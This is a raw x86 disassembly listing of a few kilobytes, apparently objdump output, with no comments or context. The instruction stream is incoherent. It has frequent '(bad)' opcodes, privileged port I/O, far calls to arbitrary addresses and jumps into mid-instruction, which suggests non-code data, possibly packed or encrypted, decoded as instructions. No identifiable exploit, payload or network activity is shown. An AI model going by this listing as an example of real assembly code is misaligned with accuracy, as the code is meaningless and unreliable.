  41fa65:	cmp    bl,BYTE PTR [esi-0x24]
  41fa68:	jle    0x41fadf
  41fa6a:	mov    dl,0x9e
  41fa6c:	inc    edx
  41fa6d:	mov    ds:0x3e949bf3,al
  41fa72:	jle    0x41fa1e
  41fa74:	xlat   BYTE PTR ds:[ebx]
  41fa75:	mov    ebp,0x43ed797d
  41fa7a:	and    DWORD PTR [edi-0x1e],0x65271d61
  41fa81:	xor    DWORD PTR [ebx+0x18e99d8],ecx
  41fa87:	mov    ebx,0x8ae7c586
  41fa8c:	or     BYTE PTR [edi-0xcfd8710],bl
  41fa92:	cmp    al,0xdf
  41fa94:	imul   ebx,edx,0x7f
  41fa97:	mov    cl,0x41
  41fa99:	mov    ds:0x47314b2d,al
  41fa9e:	inc    esp
  41fa9f:	call   0xb0e8e511
  41faa4:	iret   
  41faa5:	es gs cld 
  41faa8:	adc    DWORD PTR [ecx-0x33],0x775dde0e
  41faaf:	leave  
  41fab0:	ja     0x41fad9
  41fab2:	les    esp,FWORD PTR [ebp*4+0x5f1f30a3]
  41fab9:	mov    ebp,0x17c19aba
  41fabe:	(bad)  
  41fabf:	push   esp
  41fac0:	ds cs add ah,bh
  41fac4:	add    edx,ebx
  41fac6:	sub    ah,al
  41fac8:	add    esi,DWORD PTR [ecx-0x2fdafa94]
  41face:	jecxz  0x41fb3e
  41fad0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fad1:	xor    eax,0x4bf06f4
  41fad6:	clc    
  41fad7:	ror    BYTE PTR [edi],0xe4
  41fada:	out    0xc2,eax
  41fadc:	sbb    DWORD PTR [esi],0x48b2dfe8
  41fae2:	push   esp
  41fae3:	add    DWORD PTR [ebx],ecx
  41fae5:	dec    eax
  41fae6:	dec    ebp
  41fae7:	mov    ebx,0xd200b2e3
  41faec:	retf   
  41faed:	imul   ebp,edi,0xca6604ff
  41faf3:	cmp    ecx,ebx
  41faf5:	push   esp
  41faf6:	mov    ch,BYTE PTR [edx]
  41faf8:	sar    esp,1
  41fafa:	fmul   QWORD PTR [edx+0x17dcca24]
  41fb00:	and    DWORD PTR ds:0xf9b4260f,ebp
  41fb06:	fwait
  41fb07:	push   eax
  41fb08:	and    eax,0x257157a6
  41fb0d:	jb     0x41fae8
  41fb0f:	fs xchg ecx,eax
  41fb11:	dec    edx
  41fb12:	sub    DWORD PTR [esi],0x50a62081
  41fb18:	sbb    al,0xec
  41fb1a:	inc    ebx
  41fb1b:	or     eax,0x61c2c8a2
  41fb20:	call   0x15308ab7
  41fb25:	xchg   edx,eax
  41fb26:	sub    edi,edi
  41fb28:	pusha  
  41fb29:	jle    0x41fb02
  41fb2b:	dec    esp
  41fb2c:	call   0xa433:0xba3a510a
  41fb33:	imul   esp,DWORD PTR [edx],0x9
  41fb36:	(bad)  
  41fb37:	push   0xffffffe0
  41fb39:	add    al,0x5
  41fb3b:	in     al,dx
  41fb3c:	dec    edx
  41fb3d:	sbb    edi,DWORD PTR [eax-0x30]
  41fb40:	not    edx
  41fb42:	out    0xa8,eax
  41fb44:	in     eax,dx
  41fb45:	stc    
  41fb46:	xor    DWORD PTR [ebx-0x1b0c81fc],edx
  41fb4c:	pop    ebp
  41fb4d:	pusha  
  41fb4e:	cli    
  41fb4f:	or     BYTE PTR [eax-0x67d33693],cl
  41fb55:	int3   
  41fb56:	push   ebx
  41fb57:	or     ebp,ebp
  41fb59:	idiv   BYTE PTR [eax+0x17250204]
  41fb5f:	push   ebp
  41fb60:	xchg   ecx,eax
  41fb61:	mov    eax,ds:0x70d28b87
  41fb66:	addr16 mov edi,0xf1d5f044
  41fb6c:	and    edi,DWORD PTR [ebx+0x39]
  41fb6f:	adc    eax,0x78f97794
  41fb74:	sti    
  41fb75:	in     eax,dx
  41fb76:	mov    ebp,0xa232ec80
  41fb7b:	dec    esp
  41fb7c:	adc    al,0xad
  41fb7e:	out    dx,al
  41fb7f:	shl    DWORD PTR [esi],cl
  41fb81:	pop    ebx
  41fb82:	dec    edi
  41fb83:	jb     0x41fb2e
  41fb85:	loop   0x41fb4e
  41fb87:	jae    0x41fbc7
  41fb89:	add    eax,0xe145bcc
  41fb8e:	and    BYTE PTR [edi-0x3a],cl
  41fb91:	repz xor esi,DWORD PTR [ecx]
  41fb94:	call   0x7381:0x525eee16
  41fb9b:	adc    eax,0x8d5531c3
  41fba0:	push   ds
  41fba1:	nop
  41fba2:	cmp    al,0x5e
  41fba4:	das    
  41fba5:	xchg   edi,eax
  41fba6:	inc    ebp
  41fba7:	dec    edx
  41fba8:	das    
  41fba9:	mov    dh,0x58
  41fbab:	adc    al,0x3
  41fbad:	xchg   esi,eax
  41fbae:	cdq    
  41fbaf:	cmp    BYTE PTR [edi-0x71],al
  41fbb2:	loop   0x41fb4e
  41fbb4:	retf   
  41fbb5:	out    dx,eax
  41fbb6:	aad    0xbe
  41fbb8:	aad    0x10
  41fbba:	mov    al,ds:0xb11ea477
  41fbbf:	mov    al,ds:0xa51370eb
  41fbc4:	les    edx,FWORD PTR [ebp-0x54]
  41fbc7:	and    BYTE PTR [ecx+eax*8],cl
  41fbca:	outs   dx,DWORD PTR ds:[esi]
  41fbcb:	bound  ebx,QWORD PTR [esi-0x53301588]
  41fbd1:	popa   
  41fbd2:	inc    ecx
  41fbd3:	mov    edx,0xc8f889cc
  41fbd8:	ret    
  41fbd9:	call   0x6f6b:0x7501be15
  41fbe0:	test   eax,0x94cf8091
  41fbe5:	mov    dh,0x63
  41fbe7:	in     al,dx
  41fbe8:	call   0x2d15:0x9306ceef
  41fbef:	mov    esi,0xbe28bc0c
  41fbf4:	arpl   WORD PTR [eax-0x5b1a71c7],di
  41fbfa:	xor    ah,BYTE PTR [ebx]
  41fbfc:	(bad)  
  41fbfd:	or     ecx,DWORD PTR [eax]
  41fbff:	std    
  41fc00:	in     eax,0x94
  41fc02:	test   al,0xc9
  41fc05:	lds    edx,FWORD PTR [ecx+0x73]
  41fc08:	cmp    DWORD PTR [eax-0x2653b2c9],eax
  41fc0e:	sbb    al,0x85
  41fc10:	or     BYTE PTR [ebx+0x7a],dh
  41fc13:	ror    BYTE PTR es:[edi-0x6d40f920],cl
  41fc1a:	cmp    ebx,esi
  41fc1c:	xchg   ebp,eax
  41fc1d:	stc    
  41fc1e:	or     bl,cl
  41fc20:	fisttp WORD PTR [ebp-0x6]
  41fc23:	dec    ecx
  41fc24:	pop    ecx
  41fc25:	out    0xba,al
  41fc27:	(bad)  
  41fc28:	dec    eax
  41fc29:	inc    ebp
  41fc2a:	lea    esi,[eax]
  41fc2c:	add    eax,0x2fe8eaad
  41fc31:	xchg   esp,eax
  41fc32:	mov    ds:0xf93efaed,al
  41fc37:	cmp    al,0x9d
  41fc39:	not    DWORD PTR [ebp*8-0x38bad9a6]
  41fc40:	das    
  41fc41:	mov    dl,0xe
  41fc43:	inc    ecx
  41fc44:	shr    esp,0xe3
  41fc47:	in     al,dx
  41fc48:	(bad)  
  41fc49:	hlt    
  41fc4a:	push   edx
  41fc4b:	xor    dh,BYTE PTR [ebp+0x15]
  41fc4e:	inc    edi
  41fc4f:	cli    
  41fc50:	dec    ecx
  41fc51:	sti    
  41fc52:	xchg   ebp,eax
  41fc53:	sub    ebp,DWORD PTR [ebp-0x4d39555d]
  41fc59:	push   ebp
  41fc5a:	cli    
  41fc5b:	xor    DWORD PTR [eax-0x207aaa49],eax
  41fc61:	adc    al,0xa3
  41fc63:	das    
  41fc64:	sub    BYTE PTR [edx+0x4a],cl
  41fc67:	ss jno 0x41fc17
  41fc6a:	retf   
  41fc6b:	pop    ds
  41fc6c:	mov    al,0x49
  41fc6e:	xlat   BYTE PTR ds:[ebx]
  41fc6f:	push   esi
  41fc70:	adc    BYTE PTR [esi-0x11ca9f79],0xe3
  41fc77:	sub    BYTE PTR [ecx-0x1b],bl
  41fc7a:	or     dh,dl
  41fc7c:	mov    al,0x6f
  41fc7e:	fst    QWORD PTR [ebx+0x5c1c60d8]
  41fc84:	or     esp,DWORD PTR [edi-0x6f]
  41fc87:	mov    ebx,0x81a5a816
  41fc8c:	xchg   esi,eax
  41fc8d:	xor    DWORD PTR [eax+0x35],ebp
  41fc90:	ins    DWORD PTR es:[edi],dx
  41fc91:	ja     0x41fcbe
  41fc93:	cmp    al,0xc8
  41fc95:	loopne 0x41fc1c
  41fc97:	data16 sbb al,0x63
  41fc9a:	mov    bl,bl
  41fc9c:	shl    DWORD PTR [esi],1
  41fc9e:	clc    
  41fc9f:	adc    al,0x53
  41fca1:	imul   DWORD PTR [ebx+0x30]
  41fca4:	xor    eax,0x2dabc5e3
  41fca9:	or     bl,BYTE PTR [edi-0x1da29288]
  41fcaf:	push   ebp
  41fcb0:	pop    edx
  41fcb1:	adc    eax,0x9d0882c7
  41fcb6:	inc    ecx
  41fcb7:	scas   al,BYTE PTR es:[edi]
  41fcb8:	into   
  41fcb9:	and    edx,edi
  41fcbb:	test   eax,0x1dd0128a
  41fcc0:	adc    eax,0x9247b81d
  41fcc5:	lahf   
  41fcc6:	int3   
  41fcc7:	mov    ah,0x7f
  41fcc9:	or     eax,0xab64bce1
  41fcce:	popa   
  41fccf:	cmp    BYTE PTR [ebp+ecx*1-0x1dbf99fd],dh
  41fcd6:	and    ebx,DWORD PTR [edi+edx*4]
  41fcd9:	std    
  41fcda:	sti    
  41fcdb:	imul   edi,DWORD PTR [eax+esi*2+0x7f89906a],0x29
  41fce3:	icebp  
  41fce4:	cmp    ah,0x9d
  41fce7:	xor    eax,0x6176e9a5
  41fcec:	and    BYTE PTR [eax],dl
  41fcee:	sub    edx,DWORD PTR [eax]
  41fcf0:	push   ebx
  41fcf1:	loop   0x41fce7
  41fcf3:	or     eax,0xbc15a837
  41fcf8:	jo     0x41fd32
  41fcfa:	cmp    BYTE PTR [ebx-0x43],ah
  41fcfd:	cmp    esi,0x7d
  41fd00:	daa    
  41fd01:	call   0x2398:0x4940bde5
  41fd08:	(bad)  
  41fd09:	leave  
  41fd0a:	mov    al,0xe4
  41fd0c:	(bad)  [edi-0x60]
  41fd0f:	mov    edi,0x249def17
  41fd14:	adc    dh,0x5c
  41fd17:	mov    al,0x5a
  41fd19:	sbb    DWORD PTR [edx+0x5c0b1502],ebp
  41fd1f:	push   ecx
  41fd20:	push   es
  41fd21:	arpl   ax,cx
  41fd23:	test   eax,0x32b0aa95
  41fd28:	jnp    0x41fd0c
  41fd2a:	push   0x123d989b
  41fd2f:	idiv   BYTE PTR ds:0xeed516c8
  41fd35:	xchg   ebp,eax
  41fd36:	mov    esi,ss
  41fd38:	pop    ebp
  41fd39:	int3   
  41fd3a:	cmp    BYTE PTR [ebx],cl
  41fd3c:	out    dx,eax
  41fd3d:	mov    esi,0x84bbb3b9
  41fd42:	push   ebx
  41fd43:	stc    
  41fd44:	add    BYTE PTR [eax-0x48],ch
  41fd47:	pop    ss
  41fd48:	mov    dl,dl
  41fd4a:	sub    DWORD PTR [edx+0x13],esi
  41fd4d:	ret    
  41fd4e:	dec    eax
  41fd4f:	mov    cl,0x1d
  41fd51:	ror    BYTE PTR [edx-0x60317e0f],0x9
  41fd58:	outs   dx,BYTE PTR ds:[esi]
  41fd59:	push   eax
  41fd5a:	and    eax,0x8e482322
  41fd5f:	pushf  
  41fd60:	aaa    
  41fd61:	xchg   esi,eax
  41fd62:	pop    esi
  41fd63:	or     esp,DWORD PTR [ebp+0x76bb33ae]
  41fd69:	cmp    BYTE PTR [edx+0x682e9823],ah
  41fd6f:	sti    
  41fd70:	push   0x9cb9aaf4
  41fd75:	or     ebp,esp
  41fd77:	cs aas 
  41fd79:	jb     0x41fdeb
  41fd7b:	push   esi
  41fd7c:	pop    ebp
  41fd7d:	fdivr  st(7),st
  41fd7f:	dec    esp
  41fd80:	fild   WORD PTR [ebx-0x14dcacf6]
  41fd86:	(bad)  
  41fd87:	repz je 0x41fd9f
  41fd8a:	dec    esi
  41fd8b:	sub    esi,edx
  41fd8d:	scas   al,BYTE PTR es:[edi]
  41fd8e:	inc    edx
  41fd8f:	mov    dh,BYTE PTR [edi]
  41fd91:	adc    esp,DWORD PTR [eax]
  41fd93:	inc    dx
  41fd95:	mov    bl,0x2a
  41fd97:	in     al,dx
  41fd98:	push   ebx
  41fd99:	frstor [esi]
  41fd9b:	iret   
  41fd9c:	retf   
  41fd9d:	sahf   
  41fd9e:	jmp    0x41fd65
  41fda0:	xor    al,0x63
  41fda2:	sub    ah,ah
  41fda4:	sbb    esp,DWORD PTR [ebp+0x2d]
  41fda7:	in     eax,dx
  41fda8:	adc    BYTE PTR [edi],ch
  41fdaa:	enter  0xb772,0x29
  41fdae:	in     eax,0x1b
  41fdb0:	cmc    
  41fdb1:	jo     0x41fd84
  41fdb3:	(bad)  
  41fdb4:	icebp  
  41fdb5:	int3   
  41fdb6:	out    dx,al
  41fdb7:	test   eax,0x7bf82ef6
  41fdbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdbd:	and    BYTE PTR [edx+ecx*4],bl
  41fdc0:	jmp    0xb3140429
  41fdc5:	mov    bh,0xc3
  41fdc7:	repz pop esp
  41fdc9:	scas   eax,DWORD PTR es:[edi]
  41fdca:	sub    edi,DWORD PTR [ecx+0x39]
  41fdcd:	ficom  WORD PTR [esi]
  41fdcf:	call   0xbdb6cc8e
  41fdd4:	sbb    DWORD PTR [eax],0x54
  41fdd7:	test   DWORD PTR [edx-0x3772aaf9],0xef5885f2
  41fde1:	cwde   
  41fde2:	dec    eax
  41fde3:	mov    ch,0x74
  41fde5:	int    0xa0
  41fde7:	mov    cl,0xe8
  41fde9:	test   DWORD PTR [ebx-0xf9376bb],edi
  41fdef:	or     BYTE PTR [edi+0x5b],dl
  41fdf2:	nop
  41fdf3:	mov    dh,ah
  41fdf5:	aaa    
  41fdf6:	daa    
  41fdf7:	mul    esp
  41fdf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdfa:	shr    ebx,1
  41fdfc:	add    esp,edi
  41fdfe:	test   DWORD PTR [edx+0x68],edi
  41fe01:	popa   
  41fe02:	test   al,0xf0
  41fe04:	xchg   ecx,eax
  41fe05:	aaa    
  41fe06:	xchg   edi,eax
  41fe07:	bound  edi,QWORD PTR [ebx]
  41fe09:	rol    DWORD PTR ds:0xb0f8ffc0,1
  41fe0f:	xchg   edx,eax
  41fe10:	inc    edx
  41fe11:	mov    BYTE PTR [eax+0x34],bh
  41fe14:	xchg   ecx,eax
  41fe15:	adc    BYTE PTR [edi+0x1f208387],cl
  41fe1b:	mov    DWORD PTR [edi-0x6a08d95],ebx
  41fe21:	(bad)  
  41fe22:	mov    ah,0xd
  41fe24:	retf   0xb358
  41fe27:	outs   dx,DWORD PTR ss:[esi]
  41fe29:	test   ebx,edi
  41fe2b:	aaa    
  41fe2c:	push   ebx
  41fe2d:	mov    esi,0xf53a6c74
  41fe32:	or     al,0x2c
  41fe34:	ja     0x41fe82
  41fe36:	fcomp  DWORD PTR [edi+ebp*4]
  41fe39:	ins    BYTE PTR es:[edi],dx
  41fe3a:	(bad)  
  41fe3b:	mov    dh,BYTE PTR [esi]
  41fe3d:	mov    eax,0x4d46a556
  41fe42:	xor    ecx,eax
  41fe44:	icebp  
  41fe45:	push   cs
  41fe46:	mov    ecx,0x2a16087d
  41fe4b:	je     0x41fe71
  41fe4d:	sbb    eax,0xecff76ec
  41fe52:	test   DWORD PTR [edi+0xe],ebx
  41fe55:	imul   edi,ebx,0x3b380597
  41fe5b:	imul   esp,DWORD PTR [ebp+0x3c],0x18
  41fe5f:	add    ah,BYTE PTR [ebp+0x5ba69bd7]
  41fe65:	add    esp,ebx
  41fe67:	jmp    0x41fece
  41fe69:	shr    DWORD PTR [edx+0x72],cl
  41fe6c:	fcmovb st,st(1)
  41fe6e:	popa   
  41fe6f:	and    eax,DWORD PTR [edx-0x6c]
  41fe72:	pop    ebx
  41fe73:	xchg   ebp,eax
  41fe74:	and    esp,esi
  41fe76:	retf   0x886d
  41fe79:	push   edi
  41fe7a:	pop    eax
  41fe7b:	ror    esi,0x98
  41fe7e:	mov    dl,0x8b
  41fe80:	cmc    
  41fe81:	sti    
  41fe82:	outs   dx,BYTE PTR ds:[esi]
  41fe83:	outs   dx,DWORD PTR ds:[esi]
  41fe84:	add    eax,0x28bbc539
  41fe89:	cmp    ecx,DWORD PTR [edx]
  41fe8b:	mov    dh,0xe8
  41fe8d:	sub    al,0x13
  41fe8f:	call   0x315b4565
  41fe94:	dec    edi
  41fe95:	pop    edi
  41fe97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe98:	std    
  41fe99:	dec    edi
  41fe9a:	mov    dl,0xc
  41fe9c:	(bad)  
  41fe9d:	in     al,0xf8
  41fe9f:	nop
  41fea0:	rol    DWORD PTR [ebx+0xbca2bd9],0x9d
  41fea7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fea8:	int    0x8b
  41feaa:	pop    ebx
  41feab:	adc    bl,dh
  41fead:	(bad)  
  41feae:	xor    eax,DWORD PTR [ebp-0x1b]
  41feb1:	ror    al,0x4b
  41feb4:	jl     0x41fe6d
  41feb6:	pusha  
  41feb7:	out    0xca,eax
  41feb9:	fisub  WORD PTR [ebp-0x2b599e97]
  41febf:	mov    dl,0xe0
  41fec1:	add    edi,DWORD PTR [edi]
  41fec3:	ins    DWORD PTR es:[edi],dx
  41fec4:	shld   ebp,ebx,cl
  41fec7:	mov    BYTE PTR [eax+0x38569a79],dl
  41fecd:	dec    esi
  41fece:	mov    ebx,DWORD PTR [ebp+0x197bbfa3]
  41fed4:	xor    BYTE PTR [ebx-0x69],ch
  41fed7:	and    ebp,ebx
  41fed9:	or     edx,eax
  41fedb:	cmp    al,0xf5
  41fedd:	cmp    DWORD PTR [edx],0x61
  41fee0:	push   edx
  41fee1:	xchg   edx,eax
  41fee2:	loop   0x41ff5b
  41fee4:	lds    edi,FWORD PTR [eax+0x3c8ac28b]
  41feea:	ret    0xaf0b
  41feed:	retf   0xfb02
  41fef0:	std    
  41fef1:	sub    esp,DWORD PTR [esi+ebx*2+0x5f00b319]
  41fef8:	aam    0x52
  41fefa:	and    DWORD PTR [esi-0x6e],0xffffff96
  41fefe:	add    dl,dh
  41ff00:	lods   al,BYTE PTR ds:[esi]
  41ff01:	sub    eax,0xa3768980
  41ff06:	(bad)  
  41ff07:	fist   DWORD PTR [ebx]
  41ff09:	push   ds
  41ff0a:	fdiv   DWORD PTR [ebx-0x7f79336e]
  41ff10:	push   eax
  41ff11:	adc    eax,0x8936529d
  41ff16:	pop    bx
  41ff18:	push   ecx
  41ff19:	leave  
  41ff1a:	scas   al,BYTE PTR es:[edi]
  41ff1b:	mov    sp,0xb6f
  41ff1f:	xor    eax,0xa7f0213
  41ff24:	cdq    
  41ff25:	test   DWORD PTR [ebp-0x33145269],ebp
  41ff2b:	scas   eax,DWORD PTR es:[edi]
  41ff2c:	sbb    DWORD PTR [edx],ebx
  41ff2e:	lahf   
  41ff2f:	jnp    0x41ff34
  41ff31:	test   eax,0x21226460
  41ff36:	ds add bl,cl
  41ff39:	push   esi
  41ff3a:	leave  
  41ff3b:	xchg   edi,eax
  41ff3c:	or     eax,0x49254197
  41ff41:	or     al,0xb0
  41ff43:	push   0xffffffbe
  41ff45:	push   ebx
  41ff46:	rol    BYTE PTR [ecx-0x22],0x4a
  41ff4a:	pop    edx
  41ff4b:	pushf  
  41ff4c:	loope  0x41ff4e
  41ff4e:	adc    eax,0x9e68d2ed
  41ff53:	and    bh,BYTE PTR [ecx]
  41ff55:	xchg   edi,eax
  41ff56:	fisttp QWORD PTR [edi-0x1537a888]
  41ff5c:	push   esp
  41ff5d:	ds ja  0xeb8897a3
  41ff64:	out    dx,al
  41ff65:	push   esp
  41ff66:	fimul  WORD PTR [edx-0x3780d0a0]
  41ff6c:	cld    
  41ff6d:	mov    ebx,0xb72caf6
  41ff72:	int    0xb6
  41ff74:	idiv   BYTE PTR [edx-0x7c82d5d6]
  41ff7a:	lds    esi,FWORD PTR [esi-0xf]
  41ff7d:	int    0xab
  41ff7f:	(bad)  
  41ff80:	cli    
  41ff81:	push   edi
  41ff82:	xchg   esi,eax
  41ff83:	mov    WORD PTR [edi+eax*4],ds
  41ff86:	fsubr  DWORD PTR [eax+eax*4]
  41ff89:	add    eax,0xa05a0373
  41ff8e:	es sbb ecx,ebp
  41ff91:	add    eax,0x7e54d7cd
  41ff96:	pop    ebp
  41ff97:	pop    esi
  41ff98:	and    BYTE PTR [ebx+edx*1-0x5a58f8c7],ch
  41ff9f:	adc    al,0x46
  41ffa1:	nop
  41ffa2:	mov    bl,0xaf
  41ffa4:	arpl   WORD PTR [esi-0x37],si
  41ffa7:	daa    
  41ffa8:	cdq    
  41ffa9:	je     0x41fff8
  41ffab:	sar    edx,1
  41ffad:	movlps QWORD PTR [eax+0x2c224ce],xmm7
  41ffb4:	test   BYTE PTR [ecx-0x484677db],0x31
  41ffbb:	or     dh,BYTE PTR [ebx+0x1ab84f4c]
  41ffc1:	dec    DWORD PTR [esi+ebp*2]
  41ffc4:	mov    WORD PTR [esi-0x461023e8],?
  41ffca:	mov    ds:0xcee08507,al
  41ffcf:	xchg   edx,eax
  41ffd0:	iret   
  41ffd1:	mov    ah,0xd5
  41ffd3:	adc    al,0x52
  41ffd5:	jp     0x41ff9f
  41ffd7:	push   cs
  41ffd8:	push   ebx
  41ffd9:	sbb    ebp,DWORD PTR [edi-0x75]
  41ffdc:	rcl    DWORD PTR [edx-0x20],0x35
  41ffe0:	xchg   edx,eax
  41ffe1:	sub    BYTE PTR [ebp-0x56f96245],ch
  41ffe7:	addr16 add eax,0x8abef70d
  41ffed:	adc    DWORD PTR [ecx],eax
  41ffef:	xor    ebx,edi
  41fff1:	sahf   
  41fff2:	(bad)  
  41fff3:	fsubr  QWORD PTR ds:0x802856b2
  41fff9:	out    dx,al
  41fffa:	ror    DWORD PTR [edx-0x78],1
  41fffd:	imul   ecx,DWORD PTR [eax],0x5e
  420000:	adc    BYTE PTR [ecx],bl
  420002:	push   esi
  420003:	push   ebp
  420004:	repnz imul edx,DWORD PTR [ecx+0x6d],0x66b00cd2
  42000c:	enter  0xb98d,0x60
  420010:	aaa    
  420011:	cmp    edx,eax
  420013:	fcomp  DWORD PTR [eax+0x53c47371]
  420019:	scas   eax,DWORD PTR es:[edi]
  42001a:	aas    
  42001b:	fmul   QWORD PTR [ebp-0x6c]
  42001e:	mov    eax,0xdbb89c2d
  420023:	pop    edx
  420024:	or     DWORD PTR [esi+0x3dea6018],esi
  42002a:	call   0x6ba08dce
  42002f:	les    esp,FWORD PTR [eax]
  420031:	cmp    DWORD PTR [ebx],ecx
  420033:	call   0x84c2:0x8a20f0b6
  42003a:	cmp    edi,edi
  42003c:	mov    dh,BYTE PTR ds:0x4b0529ff
  420043:	leave  
  420044:	mov    bl,0x3b
  420046:	icebp  
  420047:	fidivr DWORD PTR [edx-0x694f94f]
  42004d:	pushf  
  42004e:	mov    dl,ah
  420050:	les    esp,FWORD PTR [edi-0x78]
  420053:	pop    ss
  420054:	out    0xa0,eax
  420056:	cmp    eax,0x955052d9
  42005b:	push   edi
  42005c:	adc    BYTE PTR [ebx-0x4fa48a8f],bl
  420062:	popf   
  420063:	nop
  420064:	mov    esi,0x98ebf9f5
  420069:	repz add DWORD PTR [edx+0x2c76630c],0xffffffb7
  420071:	push   ss
  420072:	jns    0x41fff4
  420074:	lea    esp,[esi+0x387f374c]
  42007a:	adc    al,0xaa
  42007c:	jbe    0x42009b
  42007e:	mov    ds:0xacfc4128,al
  420083:	and    ah,BYTE PTR [esi]
  420085:	xor    eax,0x80c0985e
  42008a:	int    0x82
  42008c:	fwait
  42008d:	sub    ebx,DWORD PTR [edi]
  42008f:	xchg   esi,eax
  420090:	dec    eax
  420091:	or     eax,0x51d55d60
  420096:	in     al,0xc4
  420098:	xor    eax,0xc940567c
  42009d:	push   DWORD PTR [edx+0x14c47e10]
  4200a3:	imul   edi,DWORD PTR [ebp+0x1f4c68af],0xffffff91
  4200aa:	push   ss
  4200ab:	dec    esi
  4200ac:	enter  0xfed6,0xfb
  4200b0:	push   esp
  4200b1:	loop   0x420127
  4200b3:	out    0xb4,al
  4200b5:	inc    ecx
  4200b6:	ds rcl edi,cl
  4200b9:	jb     0x4200ea
  4200bb:	pop    esp
  4200bc:	pushf  
  4200bd:	scas   al,BYTE PTR es:[edi]
  4200be:	and    edx,DWORD PTR [esi+0x7d61a0ce]
  4200c4:	loope  0x420143
  4200c6:	sar    BYTE PTR [edx-0x2],cl
  4200c9:	mov    ebp,0x72fa263c
  4200ce:	and    BYTE PTR [esp+eiz*8],dh
  4200d1:	push   ds
  4200d2:	jo     0x420150
  4200d4:	mov    DWORD PTR [esi+0x37a936b2],0xf395297f
  4200de:	cs sbb al,0xa
  4200e1:	aad    0x73
  4200e3:	in     eax,0xcc
  4200e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200e6:	es xor al,0xc4
  4200e9:	inc    ecx
  4200ea:	mov    dl,0x16
  4200ec:	hlt    
  4200ed:	mov    edi,DWORD PTR [esp+edx*4+0x20]
  4200f1:	inc    edx
  4200f2:	mov    bh,0x30
  4200f4:	out    0xd2,eax
  4200f6:	sub    DWORD PTR [edi+0x6a],esi
  4200f9:	loope  0x4200e8
  4200fb:	test   BYTE PTR [ebx-0x1b],0x4c
  4200ff:	stc    
  420100:	out    0x7c,al
  420102:	push   edi
  420103:	pop    ebx
  420104:	or     al,bl
  420106:	pop    ds
  420107:	xchg   cl,dh
  420109:	retf   0x75d4
  42010c:	cmp    DWORD PTR [ecx+0x66],0xd261d8e0
  420113:	add    eax,0xf78a5a72
  420118:	cli    
  420119:	pop    ebp
  42011a:	in     eax,0x27
  42011c:	jmp    DWORD PTR [ebx+0x19a260ef]
  420122:	jg     0x420180
  420124:	mov    eax,0x63e2faa7
  420129:	loope  0x42015e
  42012b:	push   edx
  42012c:	mov    edi,DWORD PTR [edi-0x22]
  42012f:	jb     0x42011f
  420131:	pop    eax
  420132:	je     0x4200d7
  420134:	sbb    DWORD PTR [ecx+0x13],esp
  420137:	setl   BYTE PTR [esp+edi*2+0x70]
  42013c:	sub    eax,0x6a787ca3
  420141:	and    DWORD PTR [ebx-0x724bfe26],edx
  420147:	push   ecx
  420148:	jmp    0x420105
  42014a:	ret    
  42014b:	mov    al,0xa5
  42014d:	outs   dx,DWORD PTR ds:[esi]
  42014e:	fmul   st(2),st
  420150:	inc    esp
  420151:	xchg   esp,eax
  420152:	jno    0x4200f8
  420154:	pop    ebp
  420155:	cmp    cl,BYTE PTR [eax+0x1569cb12]
  42015b:	sub    DWORD PTR [ebp-0x7991f434],0xc4c4453
  420165:	jecxz  0x42012c
  420167:	out    0xc,eax
  420169:	test   eax,0x956cae7f
  42016e:	push   cs
  42016f:	mov    BYTE PTR es:[ebx+eax*2+0x5f],0xbe
  420175:	popf   
  420176:	jle    0x42014f
  420178:	push   0xcc358f32
  42017d:	cli    
  42017e:	push   ds
  42017f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420180:	int3   
  420181:	jl     0x420199
  420183:	nop
  420184:	jecxz  0x4201d5
  420186:	cdq    
  420187:	mov    esi,0x1873c83e
  42018c:	add    BYTE PTR [esi-0x8],bl
  42018f:	aaa    
  420190:	stos   BYTE PTR es:[edi],al
  420191:	pop    ds
  420192:	mov    bh,0x4b
  420194:	cmp    eax,0x73f3fa62
  420199:	sbb    DWORD PTR [esi-0x5f9e86f3],eax
  42019f:	pop    edx
  4201a0:	je     0x420164
  4201a2:	adc    al,0xe6
  4201a4:	das    
  4201a5:	cmp    DWORD PTR [ebp+0x2d4a7003],0xfffffff2
  4201ac:	add    cl,0x73
  4201af:	addr16 es mov al,0x88
  4201b3:	mov    ah,0xbf
  4201b5:	push   es
  4201b6:	or     BYTE PTR [ebx-0x321b2a50],al
  4201bc:	sub    al,0xb3
  4201be:	loop   0x420208
  4201c0:	push   cs
  4201c1:	sub    BYTE PTR ds:0xb70201b6,dl
  4201c7:	jp     0x42021b
  4201c9:	adc    al,0xe1
  4201cb:	in     al,0xee
  4201cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201ce:	inc    esp
  4201cf:	cs int 0x47
  4201d2:	leave  
  4201d3:	jne    0x4201c5
  4201d5:	shl    DWORD PTR [esi+0x38],cl
  4201d8:	bound  eax,QWORD PTR [eax]
  4201da:	arpl   di,ax
  4201dc:	mov    esp,0xe46ebd0b
  4201e1:	sar    BYTE PTR [eax+eiz*8-0x63],0xf9
  4201e6:	adc    DWORD PTR [esi-0x414c45d8],ebx
  4201ec:	loopne 0x4201b7
  4201ee:	pop    bx
  4201f0:	and    DWORD PTR [edx+0x11],0xffffffe7
  4201f4:	add    bl,BYTE PTR [esi]
  4201f6:	ret    0x2095
  4201f9:	rcr    DWORD PTR [ebx+0x11],0x93
  4201fd:	add    ebx,DWORD PTR [ecx+0x6e]
  420200:	and    DWORD PTR [edx-0x312c20b4],esp
  420206:	loope  0x420242
  420208:	add    DWORD PTR [edx-0x30],edx
  42020b:	cwde   
  42020c:	iret   
  42020d:	or     esp,ebp
  42020f:	das    
  420210:	repz jae 0x420238
  420213:	lahf   
  420214:	add    al,0x28
  420216:	repnz out 0x5b,eax
  420219:	fidiv  DWORD PTR ds:0x9be76c48
  42021f:	popa   
  420220:	and    cl,BYTE PTR [ecx+0x29]
  420223:	loopne 0x4201fd
  420225:	shl    BYTE PTR [edi],0xc
  420228:	mul    eax
  42022a:	fcomip st,st(3)
  42022c:	mov    ebp,0x4d980e2
  420231:	or     edi,edx
  420233:	sbb    BYTE PTR [edi-0x37],ah
  420236:	xor    cl,BYTE PTR [esi-0x73]
